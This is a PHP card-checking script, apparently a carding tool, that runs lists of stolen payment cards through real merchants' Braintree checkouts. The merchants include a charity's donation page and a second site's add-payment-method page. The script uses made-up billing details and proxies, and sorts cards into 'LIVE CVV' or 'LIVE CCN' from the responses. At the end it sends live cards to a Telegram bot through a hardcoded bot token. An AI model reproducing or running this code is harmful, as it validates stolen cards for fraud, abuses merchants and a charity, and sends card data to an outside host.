<?php
include(__DIR__."/Phppot/function.php");
error_reporting(0);
$time_start = microtime(true);
set_time_limit(200);
$GATE = "BRAINTREE AUTHORISE";
extract($_GET);
//$lista = "5399767154040283|03|2023|000";
$separator = explode("|", $lista);
$cc = $separator[0];


$ccbin = substr($cc, 0,6);
$mm = $separator[1];
$yy = $separator[2];
$yy1 = substr($yy, 2,2);
$cvv = $separator[3];

$cbin = substr($cc, 0,1);
$rnum = rand(1111,9999);
$binlist = json_decode(fbanklist($bin),true);
$ccbank = $binlist['Bank'];
$ccvendor = $binlist['Vendor'];
$cctype = $binlist['Bank_Info'];
$cc_country = $binlist['Country'];
$abn = $binlist['Abn'];
$cc_emoji = $binlist['emoji'];

$info = json_decode(random_info(),true);
$fname = $info['fname'];
$lname = $info['lname'];
$email = $info['email'];
$street = $info['street'];
$city = $info['city'];
$state = $info['state'];
$phone = $info['phone'];
$postcode = $info['postcode'];

$cookie = generate_cookie();
$str = RandomString();
$proxy = get_proxies();

$cookie = randomString();
$str = substr(randomString(), 0, 7);
echo $PAGE = cURL(
    'https://www.fisherhousesocal.org/get-involved/',
    $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'referer: https://www.fisherhousesocal.org/get-involved/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
    ],
    array(
        'ywcnp_amount' => '25',
        'ywcnp_min' => '25.00',
        'ywcnp_max' => '',
        'ywcnp_currency' => 'USD',
        'quantity' => '1',
        'add-to-cart' => '356'
      ),
    "GET",
    1,
    $cookie

);
$login_nonce = GetStr($PAGE, 'name="woocommerce-login-nonce" value="', '"');
$register_nonce = GetStr($PAGE, 'name="woocommerce-register-nonce" value="', '"');

 $CHECKOUT = cURL(
    "https://www.fisherhousesocal.org/checkout/",
    $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'referer: https://www.fisherhousesocal.org/get-involved/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    ],
    '',
    "GET",
    1,
    $cookie
);$checkout_nonce = GetStr($CHECKOUT, 'name="woocommerce-checkout-nonce" value="', '"');
$ajax = GetStr($CHECKOUT, 'wc_braintree_client_token = ["', '"');            
$data = json_decode(base64_decode($ajax), true);
$fPrint = $data['authorizationFingerprint'];
$acc_token = $data['access_token'];


 $graphl = cURL(
    "https://payments.braintree-api.com/graphql",
    $headers = [
        'Accept: */*',
        'Authorization: Bearer '.$fPrint,
        'Braintree-Version: 2018-05-10',
        'Content-Type: application/json',
        'Referer: https://assets.braintreegateway.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
    ],
    '{"clientSdkMetadata":{"source":"client","integration":"custom"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4              expirationMonth      expirationYear         }   } }","variables":{"input":{"creditCard":{"number":"5125710767706115","expirationMonth":"04","expirationYear":"2024"}}},"operationName":"TokenizeCreditCard"}',
    "POST",
    1,
    $cookie
);
 $token = GetStr($graphl, '"token":"', '"');


  $confirm_method = cURL(
    "https://www.fisherhousesocal.org/?wc-ajax=checkout",
    $headers = [
        'accept: application/json, text/javascript, */*; q=0.01',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'referer: https://www.fisherhousesocal.org/checkout/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'x-requested-with: XMLHttpRequest',
    ],
    "billing_first_name=Rad&billing_last_name=Rad&billing_phone=21623241290&billing_email=dsadsadsa%40gmail.com&billing_country=US&billing_address_1=sadsa232%40gmail.com&billing_address_2=&billing_city=sdsada&billing_state=CA&billing_postcode=90001&account_password=&additional_tribute=in-honor-of&additional_in_honor=&additional_designation=general-donation&order_comments=&payment_method=braintree_cc&braintree_cc_nonce_key=$token&braintree_cc_device_data=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=&woocommerce-process-checkout-nonce=$checkout_nonce&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review",
    "POST",
    1,
    $cookie
);              
$response = GetStr($confirm_method, 'Reason:', '\t');
//  $cc_ajax_nonce = GetStr($prepare_pm, '"type":"credit_card","client_token_nonce":"', '"');
//   $ajax = cURL(
//     "https://chirohrs.com/wp-admin/admin-ajax.php",
//     $headers = [
//         "accept: */*",
//         "content-type: application/x-www-form-urlencoded; charset=UTF-8",
//         "origin: https://chirohrs.com",
//         "referer: https://chirohrs.com/my-account/add-payment-method/",
//         "x-requested-with: XMLHttpRequest",
//         "sec-fetch-site: same-origin",
//         "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0"
//     ],
//     'action=wc_braintree_credit_card_get_client_token&nonce=' . $cc_ajax_nonce,
//     "POST",
//     1,
//     $cookie
// );
// $data = json_decode(base64_decode(GetStr($ajax, '"data":"', '"')), true);
 $data = json_decode(base64_decode($data),true);
  $fPrint = $data['authorizationFingerprint'];
 $acc_token = $data['access_token'];


 $graphl = cURL(
    "https://payments.braintree-api.com/graphql",
    $headers = [
        "accept: */*",
        "Content-Type: application/json",
        "Authorization: Bearer $fPrint",
        "Host: payments.braintree-api.com",
        "Origin: https://assets.braintreegateway.com",
        "Referer: https://assets.braintreegateway.com/",
        "Braintree-Version: 2018-05-10",
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0"
    ],
    '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.RandomString().'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"90001","streetAddress":"dsadsa"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
    "POST",
    1,
    $cookie
);
 $token = GetStr($graphl, '"token":"', '"');


  $confirm_method = cURL_ProxyOn(
    "https://chirohrs.com/my-account/add-payment-method/",
    $headers = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "content-type: application/x-www-form-urlencoded",
        "referer: https://chirohrs.com/my-account/add-payment-method/",
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0"
    ],
    "payment_method=braintree_cc&braintree_cc_nonce_key=$token&braintree_cc_device_data=&woocommerce-add-payment-method-nonce=$add_pm_nonce&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1",
    "POST",
    1,
    $cookie, $proxy
);              
$response = GetStr($confirm_method, 'class="woocommerce-error" role="alert">', "</ul>");
if(strpos($confirm_method, 'Payment method successfully added.')|| strpos($response, 'Duplicate card exists in the vault')){
    $response = "Matched";
}elseif(strpos($response, "Invalid postal code")){
    $response = "Matched - AVS";
} else{
    $response = getstr($confirm_method, 'Reason: ', '</li>');
}

if (strpos($response, "Matched")){
    echo '<tr><td><span class="badge bg-success">LIVE CVV</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">'.$response.'</span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
    file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='.$lista.' '.$GATE);
}elseif (strpos($confirm_method, 'There was an error saving your payment method. Reason: Card Issuer Declined CVV')){
    echo '<tr><td><span class="badge bg-success">LIVE CCN</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Authorized</span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
    file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='.$lista.' '.$GATE);
}elseif (strpos($confirm_method, 'There was an error saving your payment method')){
    echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">"MESSAGE": '.$response.' - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}else {
    echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">"MESSAGE": MERCHANT DEAD - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}
